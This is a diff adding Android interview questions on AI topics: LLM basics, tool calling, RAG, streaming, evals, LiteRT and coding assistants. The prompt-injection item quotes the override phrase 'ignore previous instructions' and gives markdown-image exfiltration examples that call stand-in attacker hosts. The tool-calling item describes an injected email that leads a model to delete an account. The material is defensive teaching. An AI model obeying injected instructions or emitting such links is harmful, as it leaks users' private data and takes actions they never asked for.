@@ -4310,7 +4310,7 @@ NotificationCompat.Builder(context, CHANNEL_ID).setContentIntent(pi)
     section: 'AI & Tooling',
     title: 'What is MCP (Model Context Protocol), and how does it let AI applications use external tools and data?',
     tags: [ 'ai', 'mcp', 'palo-alto' ],
-    related: [  ],
+    related: [ 'tech-214', 'tech-216', 'tech-219' ],
     keyPoints: `- **MCP = Model Context Protocol**: an open protocol, introduced by Anthropic, that standardises how an AI application gets tools and context from external systems, so each tool does not need a custom integration per AI app
 - **Participants**: an **MCP host** (the AI application, e.g. an IDE or desktop assistant) creates one **MCP client** per **MCP server**; each client keeps a dedicated connection to its server. A server is any program that provides context, running locally or remotely
 - **Server primitives**: **tools** (functions the model can call, such as a database query), **resources** (data for context, such as file contents), **prompts** (reusable templates). Clients discover them with \`*/list\` calls (\`tools/list\`) and use them with \`tools/call\` and friends
@@ -4890,6 +4890,547 @@ android {
     redFlags: `- Assumes a Kotlin-only codebase is safe without checking dependencies' \`.so\` files
 - Fixes zip alignment but not ELF segment alignment, or the reverse
 - Never tests on a 16 KB device or emulator image`,
+  },
+  {
+    id: 'tech-211',
+    type: 'technical',
+    num: 211,
+    difficulty: 'E',
+    star: false,
+    section: 'AI & Tooling',
+    title: 'What should an app developer know about how LLMs work — tokens, context window, temperature, and statelessness?',
+    tags: [ 'ai', 'llm', 'tokens', 'context-window', 'basics' ],
+    related: [ 'tech-212', 'tech-213', 'tech-217' ],
+    keyPoints: `- **Tokens**: models read and write sub-word tokens, not characters or words (roughly 3–4 characters of English per token; code, non-Latin scripts and JSON cost more). Price, latency and limits are all counted in tokens.
+- **Context window**: the maximum tokens per request — system prompt + conversation history + retrieved documents + tool schemas + the **output**. Overflowing it means truncating, summarising older turns, or retrieving only what is relevant.
+- **Stateless API**: a chat model remembers nothing between calls. A "conversation" is the app resending the whole history every turn, so cost grows with conversation length — the app owns memory, trimming and persistence.
+- **Sampling controls**:
+  - **temperature** — low values make output focused and repeatable (extraction, classification), higher values more varied (brainstorming)
+  - **top-p / top-k** — restrict sampling to the most likely tokens
+  - **max output tokens** — a hard cap; a reply cut off by it is truncated mid-sentence or mid-JSON, so check the stop reason
+- **Non-determinism**: even at temperature 0 the same prompt can return different text across calls or model versions — never parse free text with brittle string matching; ask for **structured output** (a JSON schema) and validate it.
+- **Latency shape**: time-to-first-token plus per-token generation time. Long answers feel slow unless you **stream** them; short, constrained outputs are both cheaper and faster.
+- **Known failure modes**: hallucinated facts and APIs, a knowledge cutoff, and following instructions hidden in input text (prompt injection). Ground answers in supplied data and validate anything the app acts on.`,
+    answer: `- Models work in tokens; the context window caps input + history + output per request, and cost/latency scale with tokens
+- The API is stateless: the app resends history each turn, so it owns memory, trimming and persistence
+- Output is non-deterministic and can hallucinate — use low temperature, structured output and validation for anything the app acts on`,
+    followUp: `**Follow-up:** Your chat feature gets slower and more expensive the longer a user chats. Why, and what do you do?
+> Every turn resends the full history, so input tokens grow linearly per turn. Cap the history (keep the last N turns), summarise older turns into a short running summary, and pull in only relevant past messages; prompt caching on the provider side cuts the cost of a stable prefix.`,
+    redFlags: `- Assumes the model "remembers" earlier calls on its own
+- Parses free-form model text with string matching instead of requesting and validating structured output
+- Thinks temperature 0 guarantees identical output forever`,
+  },
+  {
+    id: 'tech-212',
+    type: 'technical',
+    num: 212,
+    difficulty: 'M',
+    star: true,
+    section: 'AI & Tooling',
+    title: 'On-device vs cloud generative AI on Android — when do you use Gemini Nano (AICore / ML Kit GenAI) and when a cloud model, and how do you call a cloud model safely from an app?',
+    tags: [ 'ai', 'gemini-nano', 'on-device', 'ml-kit', 'firebase', 'security' ],
+    related: [ 'tech-211', 'tech-218', 'tech-37', 'tech-118' ],
+    keyPoints: `- **On-device (Gemini Nano)**: runs through the **AICore** system service on supported devices; apps reach it through the **ML Kit GenAI APIs** (task APIs such as summarization, proofreading, rewriting and image description, plus a general prompt API).
+  - wins: works offline, no per-call cost, data never leaves the device, low latency for short tasks
+  - limits: only on a subset of recent devices, a much smaller model (narrow tasks, short context), the model may need a download first, and quotas/background limits apply
+  - always check availability at runtime (the feature status can be available, downloadable, downloading or unavailable) and fall back gracefully
+- **Cloud models**: far more capable, long context, multimodal, tool calling — at the cost of network dependency, latency, per-token billing and sending user data to a provider.
+- **Choosing**: privacy-sensitive, offline or high-frequency small tasks (smart reply, summarising a note, proofreading) → on-device; open-ended reasoning, long documents, agents → cloud. Many apps run a **hybrid**: on-device when available, cloud otherwise.
+- **Calling a cloud model safely**:
+  - **never ship a provider API key in the APK** — it can be extracted from the binary or the traffic in minutes
+  - route calls through **your own backend** (auth the user, rate-limit, log, keep the key server-side, swap models without an app release), or use **Firebase AI Logic**, which proxies Gemini calls and protects them with **App Check** (Play Integrity) instead of a shipped key
+  - rate-limit per user and cap spend — a scripted client can otherwise burn your budget
+- **Also own**: a disclosure that AI is used, user consent for sending personal data, and content safety settings.`,
+    answer: `- Gemini Nano via AICore / ML Kit GenAI: offline, private, free per call — but device-limited, smaller and needs a runtime availability check + fallback
+- Cloud models for capability (long context, reasoning, tools) at the cost of latency, billing and data leaving the device; hybrid is common
+- Never embed a provider API key in the APK — go through your backend or Firebase AI Logic with App Check, with per-user rate limits`,
+    followUp: `**Follow-up:** Product wants "summarise this chat" on every device, but Gemini Nano is only on some. What do you ship?
+> Check the on-device feature status at runtime; if available (or downloadable and the user is on Wi-Fi) run it locally, otherwise call the cloud model through the backend with explicit consent. Keep one \`Summarizer\` interface with two implementations so the UI does not care which ran.`,
+    redFlags: `- Puts a Gemini/OpenAI key in \`BuildConfig\` or \`strings.xml\` "because it is obfuscated"
+- Assumes Gemini Nano exists on every Android device and skips the availability check
+- Sends personal data to a cloud model without considering consent or the privacy policy`,
+  },
+  {
+    id: 'tech-213',
+    type: 'technical',
+    num: 213,
+    difficulty: 'M',
+    star: true,
+    section: 'AI & Tooling',
+    title: 'How do you stream an LLM response token-by-token into a Compose UI — transport, Flow, cancellation and rendering cost?',
+    tags: [ 'ai', 'llm', 'streaming', 'sse', 'flow', 'compose', 'okhttp' ],
+    related: [ 'tech-211', 'tech-117', 'tech-89', 'tech-96', 'tech-138' ],
+    keyPoints: `- **Why stream**: generation takes seconds; showing tokens as they arrive cuts *perceived* latency to time-to-first-token.
+- **Transport**: most LLM APIs stream over **Server-Sent Events** (a long-lived HTTP response of \`data:\` lines, each a JSON chunk holding a text delta). On Android use OkHttp's \`okhttp-sse\` \`EventSource\` (or Ktor), and raise the read timeout — the default can kill a long stream.
+- **Bridge to Flow** with \`callbackFlow\`: \`trySend\` each delta, \`close()\` on completion, \`close(t)\` on failure, and cancel the HTTP call in \`awaitClose\` so a cancelled collector stops the request (and the billing).
+- **ViewModel**: collect in \`viewModelScope\`, append deltas into a \`StateFlow<String>\`; keep the \`Job\` so "Stop generating" or a new question cancels the old stream.
+- **Rendering cost**: dozens of updates per second re-parse and re-lay-out the whole message. Keep the streaming text in its own composable, render plain text while streaming and markdown once complete (or re-parse at most every ~50–100 ms with \`sample\`/\`conflate\`), and use a \`LazyColumn\` with stable keys so older messages skip.
+- **Edge cases**: partial UTF-8 / partial JSON chunks (the SSE layer gives whole events — parse each one), the mid-stream error (keep the text so far and show a retry), process death (persist the finished message, not the stream), and accessibility (do not announce every token — announce on completion).
+
+\`\`\`kotlin
+fun streamChat(request: Request): Flow<String> = callbackFlow {
+    val source = EventSources.createFactory(client).newEventSource(request,
+        object : EventSourceListener() {
+            override fun onEvent(es: EventSource, id: String?, type: String?, data: String) {
+                parseDelta(data)?.let { trySend(it) }       // JSON chunk -> text delta
+            }
+            override fun onClosed(es: EventSource) { close() }
+            override fun onFailure(es: EventSource, t: Throwable?, response: Response?) { close(t) }
+        })
+    awaitClose { source.cancel() }                          // collector cancelled -> stop HTTP
+}
+
+class ChatViewModel(private val api: ChatApi) : ViewModel() {
+    private val _reply = MutableStateFlow("")
+    val reply: StateFlow<String> = _reply.asStateFlow()
+    private var job: Job? = null
+
+    fun ask(prompt: String) {
+        job?.cancel()
+        _reply.value = ""
+        job = viewModelScope.launch {
+            api.stream(prompt)
+                .catch { _reply.update { it + "\\n\\n⚠️ Interrupted — tap to retry" } }
+                .collect { delta -> _reply.update { it + delta } }
+        }
+    }
+
+    fun stop() { job?.cancel() }
+}
+\`\`\``,
+    answer: `- LLM APIs stream over SSE; wrap OkHttp's \`EventSource\` in \`callbackFlow\` and cancel the call in \`awaitClose\`
+- Collect in \`viewModelScope\`, append deltas to a \`StateFlow\`, keep the \`Job\` for stop / new-question cancellation
+- Limit render cost: plain text while streaming, markdown on completion (or sampled), isolated composable, keyed \`LazyColumn\``,
+    followUp: `**Follow-up:** The user rotates the screen mid-answer. What happens?
+> The stream lives in \`viewModelScope\`, which survives configuration change, so collection continues and the new UI just re-reads the \`StateFlow\`. Process death is different: the stream is lost, so persist completed messages and offer to regenerate the interrupted one.`,
+    redFlags: `- Collects the stream in a composable's \`LaunchedEffect\` with no owner for cancellation, or in \`GlobalScope\`
+- Forgets to cancel the HTTP call when the user leaves, so tokens keep streaming (and billing)
+- Re-parses markdown for the whole conversation on every token`,
+  },
+  {
+    id: 'tech-214',
+    type: 'technical',
+    num: 214,
+    difficulty: 'M',
+    star: true,
+    section: 'AI & Tooling',
+    title: 'What is tool (function) calling, and how does an AI agent loop work? Who actually executes the tool?',
+    tags: [ 'ai', 'llm', 'tool-calling', 'function-calling', 'agents' ],
+    related: [ 'tech-196', 'tech-216', 'tech-211' ],
+    keyPoints: `- **Tool calling**: the app sends the model a list of tools — each a name, a description and a JSON-schema for its arguments. Instead of plain text, the model may reply with a **structured request**: "call \`getOrderStatus\` with \`{ "orderId": "A12" }\`".
+- **The model never executes anything.** Your code validates the arguments, runs the function (API call, DB query, intent), and sends the **result** back as a tool-result message; the model then answers or asks for another tool.
+- **Agent loop** = repeat that until the model returns a final answer:
+  1. send history + tool schemas
+  2. model returns text (done) or tool call(s)
+  3. app executes, appends the result, goes back to 1
+- **Guardrails the app owns**:
+  - a **max-steps** cap and a timeout/budget, so a confused model cannot loop forever
+  - **argument validation** against the schema and business rules — arguments are model output, i.e. untrusted
+  - **least privilege**: expose only the tools this feature needs, with the user's own permissions
+  - **human confirmation** before side effects (send, pay, delete); read-only tools can run freely
+  - clear **error results** ("order not found") so the model can recover instead of inventing an answer
+- **Tool design matters more than prompts**: few, well-named tools with precise descriptions and narrow arguments beat many overlapping ones.
+- **Relation to MCP**: MCP standardises how tools are *discovered and connected* across apps; tool calling is how the model *uses* them inside one conversation.
+
+\`\`\`kotlin
+suspend fun runAgent(userMessage: String): String {
+    val messages = mutableListOf(Message.user(userMessage))
+    repeat(MAX_STEPS) {
+        val reply = llm.complete(messages, tools = registry.schemas())
+        val call = reply.toolCall ?: return reply.text            // final answer
+        val tool = registry[call.name]
+        val result = when {
+            tool == null -> "Error: unknown tool \${call.name}"
+            tool.hasSideEffects && !confirmWithUser(call) -> "User declined"
+            else -> runCatching { tool.run(tool.parse(call.argumentsJson)) }
+                .getOrElse { "Error: \${it.message}" }
+        }
+        messages += reply.asMessage()
+        messages += Message.toolResult(call.id, result)
+    }
+    return "Stopped after $MAX_STEPS steps"
+}
+\`\`\``,
+    answer: `- The app declares tools (name, description, JSON schema); the model replies with a structured call, and the **app** executes it and returns the result
+- An agent is that loop repeated until a final answer: send → tool call → execute → append result → send again
+- The app owns guardrails: step cap, argument validation, least privilege, user confirmation before side effects`,
+    followUp: `**Follow-up:** The model calls \`deleteAccount\` because a support email it was summarising said to. How do you prevent that?
+> That is indirect prompt injection. The summarising flow should not have that tool at all (least privilege), side-effecting tools need explicit user confirmation outside the model, and tool arguments get validated against what the user actually asked for.`,
+    redFlags: `- Believes the model itself executes code or calls the API
+- Runs model-proposed tool calls with no validation, step limit or confirmation
+- Exposes every backend endpoint as a tool "so the model can figure it out"`,
+  },
+  {
+    id: 'tech-215',
+    type: 'technical',
+    num: 215,
+    difficulty: 'M',
+    star: false,
+    section: 'AI & Tooling',
+    title: 'What is RAG (retrieval-augmented generation)? Explain embeddings, chunking and vector search, and when RAG beats fine-tuning.',
+    tags: [ 'ai', 'llm', 'rag', 'embeddings', 'vector-search' ],
+    related: [ 'tech-211', 'tech-216', 'tech-217' ],
+    keyPoints: `- **Problem**: the model does not know your private or recent data (help docs, a user's notes), and stuffing everything into the prompt does not fit or costs too much.
+- **RAG** = retrieve the few relevant pieces at question time and put them in the prompt, instructing the model to answer *from them* and cite them.
+- **Indexing (offline)**:
+  - **chunk** documents into passages (a few hundred tokens, split on headings/paragraphs, often with small overlap)
+  - **embed** each chunk with an embedding model → a vector where similar meaning ⇒ nearby vectors
+  - store vectors + text + metadata (source, date, permissions) in a **vector index**
+- **Query time**: embed the question → nearest-neighbour search (cosine similarity, usually approximate — HNSW) → top-k chunks → optionally **re-rank** → build the prompt → generate with citations.
+- **Quality levers**: chunk size and boundaries, **hybrid search** (vector + keyword/BM25, which catches exact terms like error codes), metadata filters, re-ranking, and an "I don't know" instruction when nothing relevant was retrieved.
+- **Security**: filter retrieval by the **user's permissions** before anything reaches the prompt, and treat retrieved text as untrusted (it can carry injected instructions).
+- **RAG vs fine-tuning**: RAG adds *knowledge* that changes (update the index, no retraining) and gives citations; fine-tuning changes *behaviour/style/format* and is poor at injecting facts. Long context windows reduce but do not remove the need — retrieval is still cheaper and more focused.
+- **On device**: small embedding models can run locally, with vectors stored in SQLite-based or embedded vector stores, for private search over the user's own data.`,
+    answer: `- RAG retrieves the most relevant chunks of your data at question time and grounds the model's answer in them, with citations
+- Pipeline: chunk → embed → vector index; at query time embed the question → nearest-neighbour (+ keyword, re-rank) → prompt
+- Use RAG for changing knowledge, fine-tuning for behaviour/format; filter retrieval by user permissions`,
+    followUp: `**Follow-up:** Users ask about error code "E-4012" and RAG returns unrelated chunks. Why?
+> Embeddings capture meaning, not exact tokens, so rare identifiers match poorly. Add keyword (BM25) search and merge the results (hybrid search), or route identifier-like queries to an exact lookup.`,
+    redFlags: `- Thinks fine-tuning is the way to teach a model frequently changing facts
+- Retrieves across all users' documents with no permission filter
+- Cannot explain what an embedding is or why chunk size matters`,
+  },
+  {
+    id: 'tech-216',
+    type: 'technical',
+    num: 216,
+    difficulty: 'H',
+    star: true,
+    section: 'AI & Tooling',
+    title: 'What is prompt injection, and how do you secure an LLM-powered feature in a mobile app?',
+    tags: [ 'ai', 'llm', 'security', 'prompt-injection', 'owasp' ],
+    related: [ 'tech-214', 'tech-215', 'tech-212', 'tech-180', 'tech-37' ],
+    keyPoints: `- **Prompt injection**: the model cannot reliably tell *instructions* from *data* — everything is tokens in one context. Text that says "ignore previous instructions and…" can steer it.
+  - **direct**: the user types it into the chat
+  - **indirect**: it arrives inside content the model processes — a web page, email, PDF, retrieved document, tool result — written by someone else
+- **There is no complete prompt-level fix.** Delimiting data and "do not follow instructions in the document" help, but design as if the model *will* sometimes be manipulated; limit what a manipulated model can do.
+- **Defences by layer**:
+  - **least privilege**: only the tools and data this feature needs, with the *user's* permissions, never an admin token
+  - **human confirmation** for side effects, shown by the app (not the model) with the real arguments
+  - **validate model output** like any untrusted input: schema-check JSON, allow-list actions and URLs, never \`eval\` or execute it
+  - **safe rendering**: render markdown without raw HTML, do not auto-load model-supplied image URLs (an exfiltration channel: \`![](https://evil/?d=secret)\`), never feed output into a \`WebView\` with a JavaScript bridge
+  - **no secrets in prompts**: assume the system prompt can be extracted; API keys belong on the backend
+  - **server-side enforcement**: authorisation and rate limits live on your backend, not in instructions to the model
+- **Other LLM-app risks** (OWASP Top 10 for LLM applications): sensitive data disclosure (PII in prompts or logs), excessive agency, unbounded consumption (cost abuse), and over-reliance on unverified output.
+- **Monitor**: log tool calls and refusals, alert on unusual tool sequences, and red-team with injected documents before launch.`,
+    answer: `- Prompt injection: instructions hidden in user input or in content the model reads (indirect) steer it, because it cannot separate instructions from data
+- No prompt fully fixes it — limit blast radius: least-privilege tools, app-side confirmation for side effects, server-side authorisation
+- Treat output as untrusted: validate/allow-list, render safely (no raw HTML, no auto-loaded URLs), keep secrets out of prompts`,
+    followUp: `**Follow-up:** Why is rendering a model-generated markdown image a data-exfiltration risk?
+> An injected instruction can make the model emit \`![](https://attacker.example/x?q=<private data>)\`; when the client auto-loads the image it sends that data in the URL. Block or proxy external images, or allow-list domains.`,
+    redFlags: `- Believes a stronger system prompt ("never reveal…") is sufficient protection
+- Gives the model a privileged token and relies on instructions to stop misuse
+- Renders model output as HTML in a \`WebView\` with \`addJavascriptInterface\``,
+  },
+  {
+    id: 'tech-217',
+    type: 'technical',
+    num: 217,
+    difficulty: 'H',
+    star: false,
+    section: 'AI & Tooling',
+    title: 'How do you test and evaluate an LLM feature when the output is non-deterministic?',
+    tags: [ 'ai', 'llm', 'testing', 'evals', 'quality' ],
+    related: [ 'tech-144', 'tech-61', 'tech-211', 'tech-188' ],
+    keyPoints: `- **Split the problem**: the *app code around* the model is ordinary code and gets ordinary tests; the *model behaviour* gets **evals**.
+- **Deterministic tests**: put the model behind an interface (\`LlmClient\`) and inject a **fake** returning canned responses — including malformed JSON, a truncated reply, a tool call, an error and a slow stream. Test parsing, retries, cancellation and UI states with no network and no flakiness.
+- **Evals (offline)**:
+  - a **golden dataset** of realistic inputs — common cases, edge cases, past bugs, adversarial/injection inputs
+  - **graders** in order of preference: code checks (valid schema, required fields, length, contains the citation), reference comparison, then **LLM-as-judge** with a written rubric — calibrated against human labels, since judges are biased (e.g. toward longer answers)
+  - run several samples per case and track **pass rates**, not single pass/fail
+- **Gate changes**: any prompt edit, model upgrade or retrieval change re-runs the eval suite in CI and must not regress the score. **Pin the model version** — a provider's "latest" alias can change behaviour under you.
+- **Online**: thumbs up/down, regenerate rate, edits to AI drafts, guardrail/refusal rates, latency (time-to-first-token) and cost per request; sample and review real conversations (with consent/redaction) to grow the dataset.
+- **Release safely**: feature flags, staged rollout and an A/B comparison against the old prompt or model, with a kill switch.`,
+    answer: `- Test the app code deterministically with a fake \`LlmClient\` (canned, malformed, truncated, error, slow responses)
+- Evaluate model behaviour with a golden dataset and graders — code checks first, LLM-as-judge calibrated by humans — tracking pass rates
+- Re-run evals on every prompt/model change, pin model versions, monitor real usage and roll out behind flags`,
+    followUp: `**Follow-up:** A provider ships a new model version and your summaries get worse. How would you have caught it?
+> Pin the exact model version so upgrades are deliberate, and run the eval suite against the candidate version before switching; compare scores per category and roll the switch out behind a flag.`,
+    redFlags: `- Writes unit tests that call the real model and assert exact strings
+- Judges quality by trying a few prompts by hand before release
+- Uses an unpinned "latest" model alias in production`,
+  },
+  {
+    id: 'tech-218',
+    type: 'technical',
+    num: 218,
+    difficulty: 'H',
+    star: false,
+    section: 'AI & Tooling',
+    title: 'How do you run a custom ML model on-device with LiteRT (formerly TensorFlow Lite) — delegates, quantization, threading and model delivery?',
+    tags: [ 'ai', 'ml', 'litert', 'tflite', 'on-device', 'performance' ],
+    related: [ 'tech-212', 'tech-98', 'tech-115', 'tech-163' ],
+    keyPoints: `- **LiteRT** is Google's on-device inference runtime — the new name (2024) for TensorFlow Lite. It runs \`.tflite\` models converted from TensorFlow, and also from PyTorch and JAX via converters. For common tasks (barcode, face, text recognition, translation) prefer **ML Kit**, which packages tuned models behind a simple API.
+- **Runtime**: bundle the LiteRT library, or use the **Google Play services** runtime to keep the APK smaller and get updates without shipping them.
+- **Hardware acceleration (delegates)**:
+  - **CPU** (XNNPACK) is the reliable baseline
+  - **GPU delegate** helps for larger float models (vision); not every op is supported — unsupported ops fall back to CPU and each transition costs time
+  - **NPU** access is vendor-specific; **NNAPI is deprecated** as of Android 15, so do not build new work on it
+  - benchmark per device class and fall back automatically — the "fastest" delegate varies by chip
+- **Quantization**: post-training **dynamic-range** (int8 weights, ~4× smaller), **full-integer int8** (needs a representative dataset; fastest on CPU/NPU) or **float16** (~2× smaller, GPU-friendly). Always re-measure accuracy after quantizing.
+- **Threading and lifecycle**:
+  - never run inference on the main thread — use a background dispatcher
+  - the interpreter is **not thread-safe**: one per thread, or serialise access
+  - create it once and reuse it (loading and delegate init are slow), run a warm-up inference, \`close()\` it when done
+  - reuse input/output buffers to avoid GC churn per frame
+- **Model delivery**: large models bloat the APK — download after install (Play asset/feature delivery or your CDN), verify a checksum, version it, and keep the app working until it arrives.
+- **Measure**: latency per device tier, memory, battery and thermal throttling under sustained use (Macrobenchmark/Perfetto), not just one run on a flagship.`,
+    answer: `- LiteRT (ex-TensorFlow Lite) runs \`.tflite\` models on-device; prefer ML Kit for standard tasks
+- Accelerate with GPU/NPU delegates (NNAPI is deprecated) with CPU fallback; quantize (int8/float16) and re-check accuracy
+- Inference off the main thread, reuse one interpreter per thread, warm up, close it; deliver big models after install`,
+    followUp: `**Follow-up:** The GPU delegate is slower than CPU on some devices. Why?
+> Ops the delegate does not support fall back to CPU, and every CPU↔GPU hand-off copies tensors. Small or partially-supported models can lose more on transfers than they gain. Inspect the delegate's op coverage, simplify or replace unsupported ops, or pick the delegate per device after benchmarking.`,
+    redFlags: `- Creates a new interpreter for every inference, or runs inference on the main thread
+- Starts new acceleration work on NNAPI
+- Quantizes the model and ships without measuring the accuracy drop`,
+  },
+  {
+    id: 'tech-219',
+    type: 'technical',
+    num: 219,
+    difficulty: 'M',
+    star: false,
+    section: 'AI & Tooling',
+    title: 'How do you use AI coding assistants (Gemini in Android Studio, Copilot, Claude Code) effectively and safely on a production Android codebase?',
+    tags: [ 'ai', 'tooling', 'coding-assistants', 'agents', 'code-review', 'productivity' ],
+    related: [ 'tech-196', 'tech-214', 'tech-144', 'tech-84', 'tech-116' ],
+    keyPoints: `- **Where they shine**: boilerplate (mappers, adapters, DI modules), test scaffolding, migrations with a clear pattern (Views → Compose, kapt → KSP), explaining unfamiliar code, crash/stack-trace triage, and drafting docs.
+- **Where they fail**: **hallucinated or deprecated APIs** (training cutoff vs. fast-moving Jetpack), plausible but subtly wrong concurrency or lifecycle code, ignoring your architecture conventions, and large unreviewable diffs.
+- **Give it context**: a repo instructions file (e.g. \`AGENTS.md\`) with build commands, module layout and conventions; point it at the existing pattern to copy; give it MCP or tool access to docs and the issue tracker instead of letting it guess.
+- **Work in small, verifiable steps**: plan first, then one focused change at a time; the agent should run the **build, tests, lint/detekt** itself and iterate until they pass.
+- **Guardrails**:
+  - the engineer who merges **owns** the code — review it like a junior colleague's PR, especially security, threading and error handling
+  - automated gates catch what review misses: CI tests, Android Lint, detekt, dependency/licence scanning
+  - check **every new dependency** the assistant suggests actually exists (typo-squatted or invented package names are a real supply-chain risk)
+  - no secrets, keys or customer data pasted into prompts; follow company policy on which tools may see the code
+  - run agents with least privilege (no production credentials, confirm destructive commands)
+- **Measure the effect** honestly: cycle time and defect/revert rate, not lines generated.`,
+    answer: `- Great for boilerplate, tests, pattern-based migrations and explaining code; weak on new/deprecated APIs, concurrency and conventions
+- Give it context (AGENTS.md, existing patterns, tool access) and work in small steps it verifies with build, tests and lint
+- You own what you merge: review like a junior's PR, keep CI gates, verify new dependencies, never paste secrets`,
+    followUp: `**Follow-up:** An assistant adds a Gradle dependency you have never heard of. What do you check?
+> That it exists on the expected repository under the exact group/artifact, is maintained, has a compatible licence and version, and is actually needed — models sometimes invent plausible package names, and attackers register them.`,
+    redFlags: `- Merges large AI-generated diffs without reading them because "the tests pass"
+- Pastes API keys or production data into a chat assistant
+- Treats AI output as authoritative on API availability without checking the docs`,
+  },
+  {
+    id: 'tech-220',
+    type: 'technical',
+    num: 220,
+    difficulty: 'M',
+    star: false,
+    section: 'AI & Tooling',
+    title: 'How do you brief an AI coding agent so its output is easy to verify — context, constraints, acceptance criteria?',
+    tags: [ 'ai', 'tooling', 'coding-assistants', 'prompting', 'verification' ],
+    related: [ 'tech-219', 'tech-221', 'tech-223' ],
+    keyPoints: `- **Most bad AI output is a bad brief.** The model fills every gap with a plausible default — often an outdated library, a different architecture or a scope you did not ask for. Verification starts with a brief that says what "correct" means.
+- **A good brief has five parts**:
+  - **goal**: the user-visible outcome, not just "fix the bug"
+  - **context**: the files/modules involved and an *existing example to copy* ("follow \`OrderRepository\`'s pattern")
+  - **constraints**: libraries and versions in use, what must not change (public API, DB schema), no new dependencies without asking
+  - **acceptance criteria**: the checks that prove it works — a failing test that must pass, a command (\`./gradlew :feature:orders:testDebugUnitTest lint\`), a screen to look at
+  - **output shape**: small diff, list of files touched, and a summary of assumptions it made
+- **Durable context goes in the repo**, not every prompt: an instructions file (e.g. \`AGENTS.md\`) with build/test commands, module layout and conventions.
+- **Plan before code** for anything non-trivial: ask for a plan, correct it (cheap), then let it implement (expensive to correct afterwards).
+- **One change per task.** A 2,000-line diff touching ten concerns cannot be reviewed; three 150-line diffs can.
+- **Ask it to surface uncertainty**: "list anything you assumed or could not verify" turns hidden guesses into a review checklist.
+- **Iterate on evidence, not adjectives**: paste the actual compiler error, test failure or screenshot instead of "it doesn't work".`,
+    answer: `- Gaps in the brief get filled with plausible defaults, so define "correct" up front
+- Brief = goal, context (files + an existing pattern to copy), constraints, runnable acceptance criteria, small-diff output with stated assumptions
+- Keep durable rules in an AGENTS.md, plan before coding, one change per task, feed back real errors`,
+    followUp: `**Follow-up:** The agent "fixed" a crash by wrapping the call in \`try/catch\` and swallowing the exception. What was missing from your brief?
+> Acceptance criteria and constraints: the brief should say the root cause must be fixed, exceptions must not be swallowed, and include a test reproducing the crash that must pass for the right reason. Ask for the root-cause explanation before the patch.`,
+    redFlags: `- Prompts "add caching to the app" with no files, constraints or definition of done
+- Lets one task sprawl into a huge mixed diff
+- Responds to failures with "still broken, try again" instead of the actual error`,
+  },
+  {
+    id: 'tech-221',
+    type: 'technical',
+    num: 221,
+    difficulty: 'M',
+    star: true,
+    section: 'AI & Tooling',
+    title: 'How do you verify AI-generated Android code before merging it? Walk through your checklist.',
+    tags: [ 'ai', 'verification', 'code-review', 'coding-assistants', 'quality' ],
+    related: [ 'tech-219', 'tech-222', 'tech-223', 'tech-224', 'tech-225', 'tech-89' ],
+    keyPoints: `- **Mindset**: AI code is *plausible by construction* — it compiles and reads well, so bugs hide where reviewers skim. Review it more carefully than a colleague's PR, not less.
+- **1. Read the whole diff yourself.** Can you explain every line? Anything you cannot explain does not merge. Watch for files it touched that the task did not need.
+- **2. Machine gates first**: it compiles, all tests pass, Android Lint / detekt / ktlint clean, no new warnings suppressed (\`@Suppress\`, \`@SuppressLint\`, \`!!\` added to silence the compiler).
+- **3. Android hot spots** — where plausible code is most often wrong:
+  - **lifecycle**: collecting flows without \`repeatOnLifecycle\`, \`GlobalScope\`, holding a \`Context\`/\`View\` in a long-lived object (leaks)
+  - **threading**: blocking I/O on the main thread, missing \`withContext(Dispatchers.IO)\`, swallowed \`CancellationException\`
+  - **state**: lost on rotation or process death, \`remember\` where \`rememberSaveable\`/\`ViewModel\` was needed
+  - **errors**: \`catch (e: Exception)\` that hides failures, empty error branches, no retry/empty states
+  - **security**: secrets in code, \`exported=true\`, cleartext traffic, disabled certificate checks
+- **4. APIs and dependencies**: every unfamiliar API and library checked against official docs for your \`minSdk\`/\`targetSdk\` and library versions — deprecated or invented APIs are common (see the next question).
+- **5. Behaviour, not just build**: run it — happy path, error path, rotation, process death ("Don't keep activities"), offline, large font, dark mode, TalkBack.
+- **6. Tests that mean something**: new behaviour has a test that *fails without the change*, and the AI did not weaken existing tests to make them pass.
+- **7. Fit**: matches the module's architecture and naming; no duplicated helper that already exists in the codebase.
+
+\`\`\`kotlin
+// AI-generated: compiles, demo works — keeps collecting while the app is in the background
+lifecycleScope.launch {
+    viewModel.state.collect { render(it) }
+}
+
+// Reviewed: collection stops below STARTED and restarts when visible
+viewLifecycleOwner.lifecycleScope.launch {
+    viewLifecycleOwner.repeatOnLifecycle(Lifecycle.State.STARTED) {
+        viewModel.state.collect { render(it) }
+    }
+}
+\`\`\``,
+    answer: `- Read and be able to explain every line; reject scope creep; run compile, tests, Lint/detekt with no new suppressions
+- Check Android hot spots (lifecycle, threading, state survival, error handling, security) and verify unfamiliar APIs against docs
+- Run the real behaviour (errors, rotation, process death, offline, a11y) and require tests that fail without the change`,
+    followUp: `**Follow-up:** All tests are green on the AI's PR. Why is that not enough?
+> Green only proves the code satisfies the tests that exist. The AI may have edited or weakened tests, added tests that assert nothing meaningful, or changed code no test covers. Check the test diff first, and confirm new tests fail on the old code.`,
+    redFlags: `- "It compiles and the tests pass, so it's fine"
+- Accepts \`@Suppress\`, \`!!\` or a broad \`catch\` that the AI added to make errors disappear
+- Never runs the feature on a device before merging`,
+  },
+  {
+    id: 'tech-222',
+    type: 'technical',
+    num: 222,
+    difficulty: 'M',
+    star: true,
+    section: 'AI & Tooling',
+    title: 'How do you catch hallucinated or outdated APIs and advice in AI output, especially for fast-moving Android and Jetpack?',
+    tags: [ 'ai', 'verification', 'hallucination', 'documentation', 'deprecation' ],
+    related: [ 'tech-221', 'tech-199', 'tech-200', 'tech-197', 'tech-205' ],
+    keyPoints: `- **Why it happens**: a model's knowledge stops at a training cutoff and reflects what was *common* on the internet — so it confidently recommends the popular old way, and blends similar APIs into ones that do not exist (wrong parameter names, a method from a different library version).
+- **Typical Android traps**:
+  - \`onBackPressed()\` overrides instead of \`OnBackPressedCallback\` / predictive back
+  - \`window.statusBarColor\` — has no effect once you target SDK 35 and are edge-to-edge
+  - kapt instead of KSP, \`kotlinOptions\` instead of \`compilerOptions\`, a separate Compose compiler version on Kotlin 2.x
+  - \`AsyncTask\`, \`startActivityForResult\`, \`LocalBroadcastManager\` in new code
+  - invented Gradle coordinates or versions that were never published
+- **Verification moves**:
+  - **compile against your real versions** — a hallucinated method fails immediately; a deprecated one shows a warning (keep \`-Werror\` / "warnings as errors" for deprecations on new code if you can)
+  - **check the primary source**: developer.android.com reference + "Added in API level", the AndroidX release notes, the Kotlin "What's new" page — not a blog or another AI
